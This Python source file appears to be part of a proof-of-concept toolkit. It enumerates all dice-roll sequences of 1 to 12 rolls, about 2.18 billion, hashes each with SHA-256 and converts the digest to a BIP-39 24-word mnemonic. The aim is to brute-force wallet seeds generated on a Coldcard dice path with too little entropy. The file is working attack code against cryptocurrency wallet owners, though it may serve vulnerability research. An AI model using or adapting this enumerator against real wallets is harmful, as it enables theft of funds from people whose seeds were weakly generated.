"""Coldcard dice path weak-key enumerator — Generator implementation"""
import sys, os, hashlib
from typing import Iterator, Optional, Tuple

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "ngu"))
import bip39

from base import PocGenerator

MAX_ROLLS = 12
DICE = "123456"


def index_to_rolls(length: int, index: int) -> str:
    """Convert an index to a dice roll sequence (base-6 encoding, characters 1-6)"""
    rolls = []
    for _ in range(length):
        index, rem = divmod(index, 6)
        rolls.append(DICE[rem])
    return ''.join(reversed(rolls))


def dice_to_mnemonic(rolls_str: str) -> str:
    """Dice roll sequence -> BIP-39 24-word mnemonic"""
    md = hashlib.sha256(b'')
    for ch in rolls_str:
        md.update(ch.encode())
    return bip39.b2a_words(md.digest())


class DiceNoFloorGenerator(PocGenerator):
    """
    Enumerate all combinations of 1 to 12 dice rolls and compute the
    corresponding BIP-39 mnemonic.
    Total space = sum(6^k for k=1..12) = 2,176,782,336
    """

    @property
    def poc_id(self) -> str:
        return "dice_no_floor"

    @property
    def poc_name(self) -> str:
        return "Dice path with no entropy floor"

    @property
    def total_space(self) -> int:
        return sum(6 ** k for k in range(1, MAX_ROLLS + 1))

    def generate(self, start_index: int) -> Iterator[Tuple[int, Optional[str]]]:
        """
        Map a global index to (roll_length, sub_index):
          index 0..(6^1-1)        -> roll_length=1
          index 6^1..(6^1+6^2-1)  -> roll_length=2
          ...
        """
        global_idx = start_index
        offset = 0
        for rl in range(1, MAX_ROLLS + 1):
            space = 6 ** rl
            if global_idx < offset + space:
                break
            offset += space
        else:
            return

        sub_idx = global_idx - offset

        for rl_iter in range(rl, MAX_ROLLS + 1):
            space = 6 ** rl_iter
            si = sub_idx if rl_iter == rl else 0

            for idx in range(si, space):
                rolls = index_to_rolls(rl_iter, idx)
                mnemonic = dice_to_mnemonic(rolls)
                yield (global_idx, mnemonic)
                global_idx += 1

            sub_idx = 0
